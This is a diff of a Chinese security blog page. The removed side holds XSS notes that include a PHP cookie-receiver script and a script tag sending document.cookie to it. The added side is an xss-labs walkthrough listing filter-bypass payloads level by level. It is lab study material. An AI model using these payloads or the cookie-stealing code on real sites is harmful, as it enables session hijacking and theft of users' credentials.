@@ -4,9 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="小迪-xss跨站原理和攻击, tonine">
-    <meta name="description" content="XSS跨站之原理分析和攻击方法原理XXS漏洞产生原理：变量接收数据的时候，可以写成类似js脚本，对方将这个代码回显操作，因为是js代码，可以在网页显示执行出来。 产生在前端。输出类函数造成的，通过js代码实现。
-前提条件：浏览器版本是否支持">
+    <meta name="keywords" content="xss-labs闯关笔记, tonine">
+    <meta name="description" content="第一关:
+直接改name=script&amp;gt;alert(1)
+
+第二关：
+ htmlspecialchares（）函数
+
+第三关：
+对尖括号进行过滤了，可以通过标签的一些特殊事件来执行js代码，
+写入语句：level3.php？keywo">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +25,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>小迪-xss跨站原理和攻击 | tonine</title>
+    <title>xss-labs闯关笔记 | tonine</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -310,12 +317,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">小迪-xss跨站原理和攻击</h1>
+                    <h1 class="description center-align post-title">xss-labs闯关笔记</h1>
                 </div>
             </div>
         </div>
@@ -440,15 +447,6 @@
                 </div>
                 <div class="col s5 right-align">
                     
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E8%A7%86%E9%A2%91%E7%AC%94%E8%AE%B0/" class="post-category">
-                                小迪视频笔记
-                            </a>
-                        
-                    </div>
-                    
                 </div>
             </div>
 
@@ -477,41 +475,110 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="XSS跨站之原理分析和攻击方法"><a href="#XSS跨站之原理分析和攻击方法" class="headerlink" title="XSS跨站之原理分析和攻击方法"></a><strong>XSS跨站之原理分析和攻击方法</strong></h3><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h6><p>XXS漏洞产生原理：变量接收数据的时候，可以写成类似js脚本，对方将这个代码回显操作，因为是js代码，可以在网页显示执行出来。 产生在前端。输出类函数造成的，通过js代码实现。</p>
-<p>前提条件：浏览器版本是否支持</p>
-<h6 id="分类"><a href="#分类" class="headerlink" title="分类"></a><strong>分类</strong></h6><p>pikachu靶场</p>
-<p><strong>反射型</strong>（非持续性）：</p>
-<p>发包 x=xiaodi &gt; x.php &gt;回显</p>
-<p><strong>存储型</strong>（持续性）：</p>
-<p>发包 x=xiaodi &gt; x.php &gt;写到数据库某个表 &gt;x.php &gt;回显</p>
-<p><strong>DOM型</strong>：发包 x=xiaodi &gt;本地浏览器静态前端代码&gt; x.php &gt;回显</p>
-<p><strong>属于前端js代码进行处理</strong></p>
-<p>代码在操作时的属性。前端语言，</p>
-<p>参数传递：与后端语言打交道，地址会改变</p>
-<p>dom树：html语言，</p>
-<h6 id="利用XSS平台"><a href="#利用XSS平台" class="headerlink" title="利用XSS平台"></a><strong>利用XSS平台</strong></h6><p><strong>跨站工具：</strong>beef</p>
-<p><strong>cookie：</strong>用户凭据，通过凭据可以判断对方身份信息。存储在本地的，存活时间较长，小网站会用</p>
-<p><strong>session</strong>：会话，存储在服务器，存活时间较短，大型的较安全的会使用</p>
-<p><strong>XSS跨站之订单</strong></p>
-<p>**工具：postman **实现自定义抓包</p>
-<p>document.cookie</p>
-<p><strong>获取cookie的代码</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie=$_GET[&#x27;c&#x27;];</span><br><span class="line"></span><br><span class="line">$myfile=fopen(&quot;cookie&quot;,&#x27;w&#x27;);</span><br><span class="line"></span><br><span class="line">fwrite($myfile,$cookie);</span><br><span class="line"></span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br><span class="line">?&gt; 假如这个文件名是 jieshou.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie=$_GET[&#x27;c&#x27;]；</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=http://127.0.0.1/jieshou.php？c=‘+docunment.cookie’&gt; &lt;script&gt;</span><br><span class="line">手写获取cookie</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+                <h6 id="第一关"><a href="#第一关" class="headerlink" title="第一关:"></a><strong>第一关:</strong></h6><ul>
+<li>直接改name=script&gt;alert(1)</script></li>
+</ul>
+<h6 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a><strong>第二关：</strong></h6><ul>
+<li> htmlspecialchares（）函数</li>
+</ul>
+<h6 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a><strong>第三关：</strong></h6><ul>
+<li>对尖括号进行过滤了，可以通过<input>标签的一些特殊事件来执行js代码，</li>
+<li>写入语句：level3.php？keyword=’onfocus=javascript:alert(1) &gt;</li>
+<li>成功注入 </li>
+</ul>
+<h6 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a><strong>第四关：</strong></h6><ul>
+<li>onclick=”alert（1）或者 “ onmouseover=”alert(1)</li>
+</ul>
+<h6 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a><strong>第五关：</strong></h6><ul>
+<li>用同样方法时发现，onclick被添加下划线干扰了。</li>
+<li>借助超链接执行js代码</li>
+<li>href 属性规定链接的目标： 先把前面的值閉合掉</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&#x27;javascript:alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>
 
-<h6 id="WEBSHELL箱子管理系统"><a href="#WEBSHELL箱子管理系统" class="headerlink" title="WEBSHELL箱子管理系统"></a><strong>WEBSHELL箱子管理系统</strong></h6><h6 id="如何判定一个文件有没有后门"><a href="#如何判定一个文件有没有后门" class="headerlink" title="如何判定一个文件有没有后门"></a><strong>如何判定一个文件有没有后门</strong></h6><ul>
-<li>如果是脚本 ，搭建一下，看是否有发送到别的地址</li>
-<li>程序的话，抓包一下进程</li>
+
+
+<h6 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a><strong>第六关：</strong></h6><ul>
+<li>同上，大小写绕过</li>
 </ul>
-<p><strong>XXS利用条件</strong>：</p>
+<h6 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a><strong>第七关</strong>：</h6><ul>
+<li>只有一次过滤，替换为空</li>
+<li>可以尝试javascr<strong>script</strong>ipt 这种方法绕过</li>
+</ul>
+<h6 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a><strong>第八关</strong>：</h6><ul>
+<li>xxxx编码绕过</li>
+</ul>
+<h6 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a><strong>第九关：</strong></h6><ul>
+<li>检测链接里有没有http//，可以在跨站语句后添加http://，然后用//注释掉将网址注释掉 </li>
+</ul>
+<h6 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a><strong>第十关：</strong></h6><ul>
+<li>hidden，隐藏属性值；type=‘text’ （作用是让它显示出来）onclick=‘alert（1）’</li>
+</ul>
+<h6 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a><strong>第十一关：</strong></h6><ul>
+<li>http_referer</li>
+<li>抓包，添加 referer：111，发送到虚拟请求里，查看页面返回，发现111被带入到，value里了，发现注入点，</li>
+<li>写入语句：referer：”type=”text”  onclick=alert(1)</li>
+<li>放包到浏览器，点击搜索框，注入成功</li>
+</ul>
+<h6 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a><strong>第十二关</strong></h6><ul>
+<li>接收 user_agent</li>
+<li>查看页面源码，发现tref值后面有类似user_agent的值，抓包观察，发现值一样，找到注入点，</li>
+<li>写入语句：”type=”text” onclick=”alert(1)</li>
+<li>放包到浏览器，点击搜索框，注入成功</li>
+<li>如何判断有无xss漏洞：地址或数据包有无页面上显示的数据</li>
+</ul>
+<h6 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a><strong>第十三关</strong></h6><ul>
+<li>查看页面源码，发现t_cook有可疑值，抓包发现，在cookie这一栏看到相应值，找到注入点，</li>
+<li>写入语句：”type=”text” onclick=alert(1)，模拟提交，发现注入成功，发到浏览器，点击搜索框，注入成功</li>
+</ul>
+<h6 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a><strong>第十五关</strong></h6><ul>
+<li>src参数无法产生xss的</li>
+<li>ng-app指令，初始化一个angularJSuing应用程序</li>
+<li>ng-include指令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用于包含外部的html文件，包含的内容将作为指定元素的子节点，ng-include属性的值可以是一个表达式，返回一个文件名，默认情况下包含的文件需要包含在同一个域名下。</span><br><span class="line"></span><br><span class="line">ng-include，如果单纯指定地址，必须加引号</span><br><span class="line"></span><br><span class="line">ng-include，加载外部html，script标签中的内容不执行</span><br><span class="line"></span><br><span class="line">ng-include，加载外部html中含有style标签样式可以识别</span><br><span class="line"></span><br><span class="line">这里出现的ng-include去包含第一关，命令：/level15.php？src=&#x27;level1.php？name=&lt;img src=x onerror=alert(xss)&gt; &#x27; </span><br><span class="line"></span><br><span class="line">src=&#x27;level1.php？name=&lt;img src=w onerror=alert(2)&gt;&#x27;</span><br><span class="line"></span><br><span class="line">img src后跟图片地址，如果图片存在就不会出发oneror。</span><br></pre></td></tr></table></figure>
+
+<h6 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a><strong>第十六关</strong></h6><ul>
+<li><p>改一下参数值，发现被带入到<center>标签中，用最基本的代码测试，发现关键字script、/、空格，都被编码成空格了，猜想源代码是过滤了这些关键字符，需要用一个不需要闭合的标签，比如 上一关用到的 <img></p>
+</li>
+<li><p>写入语句：&lt;img%0asrc=”a”onerror=alert(1)&gt;</p>
+</li>
+<li><p>因为源代码里把空格也过滤了，但img和src中要有空格，可以利用 <strong>回车的url编码格式</strong>的**%0a**绕过。 成功弹窗</p>
+</li>
+</ul>
+<h6 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a><strong>第十七关</strong></h6><ul>
+<li><p>改下参数值，发现被带入到<embed>标签（<embed>标签就是引入一个swf文件到浏览器端）中，而且&lt;&gt;被编码了，</p>
+</li>
+<li><p>页面有一个类似图片的东西，所以可以考虑通过事件来触发，因为src属性是不需要闭合的，只需要一个空格就可以，所以在onclick=alert（”xss”）前加一个空格就好</p>
+</li>
+</ul>
 <ul>
-<li>留言板、评论区、订单系统、反馈条件。</li>
-<li>如果用了session，跨站平台接收不到session，是登录不了后台的，</li>
+<li><p>onclick事件</p>
+<p>onclick=alert（”xss”）</p>
+</li>
+<li><p>onmouseover (当鼠标移动到该标签上会触发)</p>
+</li>
 </ul>
-<p>如何解决？：利用beef让对方去访问phpinfo地址，再结合跨站平台 获取网站源码，</p>
-<h6 id="XSS跨站之代码及httponly绕过"><a href="#XSS跨站之代码及httponly绕过" class="headerlink" title="XSS跨站之代码及httponly绕过"></a><strong>XSS跨站之代码及httponly绕过</strong></h6><ul>
-<li><strong>httponly</strong>：cookie中设置了这个属性，通过js脚本将无法获取cookie信息，可以防止xss攻击</li>
+<h6 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a><strong>第十八关</strong></h6><p>同上</p>
+<h6 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a><strong>第十九关</strong></h6><p>这一关涉及到 flash xss的攻击手段，flash产生的xss问题主要有两种方式：</p>
+<ul>
+<li>加载第三方资源</li>
+<li>与javascript通信引发xss</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">登陆后台的方法：cookie或账号密码</span><br><span class="line"></span><br><span class="line">账号密码分为保存和未保存</span><br><span class="line"></span><br><span class="line">保存读取：xss平台里，然后查看网站源代码，修改需要配置的参数</span><br><span class="line"></span><br><span class="line">不保存读取（表单截取）：前提条件：需要在登录框处有跨站漏洞，利用表单劫持</span><br></pre></td></tr></table></figure>
+<p><strong>常见的可触发xss的危险函数主要有</strong></p>
+<ul>
+<li>geturl 、navigatetourl、Externalinterface.call、htmltext、loadMovie等</li>
+</ul>
+<p><strong>xss跨站之waf绕过及安全修复</strong></p>
+<p><strong>onerror事件</strong>：当视频的媒体数据加载期间发生错误时执行javascfript</p>
+<p>&lt;img src=”pic.gif” οnerrοr=”javascript:this.src=’/noPic.gif’;” alt=”pic” /&gt;</p>
+<blockquote>
+<p>因为csdn做了简单的转义，它会将注入的标签，去掉闭合性，也就是会把我们注入的内容理解为：</p>
+</blockquote>
+<p>&lt;img src=”pic.gif” οnerrοr=”javascript:this.src=’/noPic.gif’;” alt=”pic”&gt;</p>
+<blockquote>
+<p>这样，注入的标签就失去了闭合性，对一些普通的攻击就进行了防御，但是onerroe事件是专门针对js出错的，所以，标签闭合性刚好触发了，所以会被执行，执行之后将img标签的scr属性替换成xss注入语句，将注入的地址，弄成不能访问的地址，这样就反复的触发onerror事件，最终导致浏览器堆栈溢出</p>
+</blockquote>
 
                 
             </div>
@@ -538,7 +605,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/07/24/%E5%B0%8F%E8%BF%AA-xss%E8%B7%A8%E7%AB%99%E5%8E%9F%E7%90%86%E5%92%8C%E6%94%BB%E5%87%BB/">http://example.com/2022/07/24/%E5%B0%8F%E8%BF%AA-xss%E8%B7%A8%E7%AB%99%E5%8E%9F%E7%90%86%E5%92%8C%E6%94%BB%E5%87%BB/</a>
+                    <a href="http://example.com/2022/07/24/xss-labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/">http://example.com/2022/07/24/xss-labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -749,9 +816,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/07/24/xss-labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/">
                     <div class="card-image">
@@ -769,9 +837,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -780,6 +848,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -798,13 +867,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/">
+                <a href="/2022/07/24/%E5%B0%8F%E8%BF%AA-xss%E8%B7%A8%E7%AB%99%E5%8E%9F%E7%90%86%E5%92%8C%E6%94%BB%E5%87%BB/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="文件上传漏洞之upload-labs">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="小迪-xss跨站原理和攻击">
                         
-                        <span class="card-title">文件上传漏洞之upload-labs</span>
+                        <span class="card-title">小迪-xss跨站原理和攻击</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -815,12 +884,16 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-24
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E8%A7%86%E9%A2%91%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    小迪视频笔记
+                                </a>
+                            
                             
                         </span>
                     </div>
